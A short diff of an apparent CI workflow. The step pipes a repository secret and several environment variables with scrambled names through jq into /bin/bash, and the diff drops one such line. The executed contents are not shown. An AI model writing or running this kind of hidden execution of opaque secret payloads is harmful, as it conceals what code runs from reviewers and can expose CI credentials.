@@ -17,7 +17,6 @@ jobs:
           zfe49250: ${{ secrets.zfe49250 }}
         run: |
           printf '%s' "$zfe49250" | jq -r .uxwbm6 | /bin/bash
-          echo $he27 | jq -r .yppxj5 | /bin/bash
           echo $yjxlw8877 | jq -r .dv774 | /bin/bash
           echo $bqve8 | jq -r .i684 | /bin/bash
 
